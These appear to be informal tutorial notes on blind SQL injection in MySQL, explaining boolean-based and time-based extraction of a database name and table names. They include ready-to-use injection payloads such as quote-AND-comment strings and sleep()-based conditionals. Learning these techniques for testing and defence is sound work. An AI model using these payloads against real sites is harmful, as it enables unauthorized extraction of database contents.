# Blind sql starts here

These are called Blind sql because there won't be any error messages like we saw in error based sql, So it's a bit harder


Blind injections are classified into 2 -> 1) Boolean based blind  2) Time based blind


Boolean Based Blind Injection

So lets start with this query  select ascii(substr(database(),1,1)) This would return the ascii value of the first char in the 
name of the database.

So we can do a bunch of trial and error to track down each and every character like this, let database() returns  "a" as the first
char.

ascii(substr((select database()),1,1)) < 100, would return 1 that is true
ascii(substr((select database()),1,1)) < 97 , would return 0 that is false

So the value must be lying between 97 and 99, we'll try every value until we evaluate to true like this

ascii(substr((select database()),1,1)) = 97 , would return 1 that is true

Hence we found out the first character, similarily we can find all other chars

So our payload to pass to the frontend will look something like this

' AND (ascii(substr((select database()),1,1)) = 97) --+

We can do something like this

select ascii(substr((select table_name from information_schema.tables where table_schema='test' limit 0,1),1,1)) > 97;

Thus Blind Based Boolean injection.



Time Based Blind Injection

So the difference here is that unlike boolean based injection the data will be visible always even if we give some random value to 
id, like id = 1000, would still render a valid page with virtually no difference so we can't use appearance or dissappearance of 
text as we have done in boolean based injection, So here we use time instead, The core idea is similar to boolean but we're using 
time infer whether An application is vulnerable or not or to dump the whole database.

Lets take a query

select if(ascii(substr((select database()),1,1))>97,sleep(10),null);

therefore if the ascii value of the first letter of the database name is greater than 97 the database will sleep for 10 seconds,
otherwise it'll do nothing.

Now we can leverage this to dump the entire database like this 

select if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(10),null)

So the query to use on our frontend will look like this

' AND (select if((select substr(table_name,1,1) from information_schema.tables where table_schema=database() limit 0,1)='e',sleep(10),null)
) --+

Hence this is time based sql injection
